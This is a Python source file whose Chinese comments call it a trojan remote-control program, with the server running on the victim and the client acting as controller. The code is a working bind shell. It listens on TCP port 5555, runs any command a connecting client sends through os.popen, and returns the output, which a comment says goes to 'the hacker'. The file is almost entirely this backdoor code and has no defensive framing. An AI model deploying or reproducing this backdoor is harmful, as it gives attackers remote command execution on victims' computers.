#远程控制程序（木马），服务端（被害者），客户端（控制端）
#1、socket进行网络连接  2、对操作系统命令的控制（cmd）

import socket
import os

def main():

    #socket初始化
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 5555
    s.bind((host,port)) #绑定
    s.listen(5)

    #循环等待客户端对服务端的监听
    while True:
        c,addr = s.accept() #如果有人来连接我，就打印地址并发送
        print("连接地址：",addr)
        c.send("欢迎连接~".encode("utf-8"))

        while True:
            try:
                #接收控制端发送的普通文字
                recv_data = c.recv(1024).decode("utf-8")
                print(recv_data)
                if recv_data == 'cmd':
                    c.send("cmd start".encode("utf-8"))
                    while True:
                        #循环接收控制端发来的命令
                        #c.send("cmd start".encode("utf-8"))
                        data = c.recv(1024)
                        recv_data2 = data.decode("utf-8")
                        if recv_data2 == 'exit':
                            c.send("cmd stop".encode("utf-8"))
                            break
                        else:
                            #执行控制端发送的命令并且读取命令执行的结果
                            x = os.popen(recv_data2).read()
                            #把命令的回显发送给黑客
                            c.send(x.encode("utf-8"))
                else:
                    c.send(recv_data.encode("utf-8"))

            except:
                print("断开连接")
                break
        c.close()
    s.close()

    pass


if __name__ == '__main__':
    main()

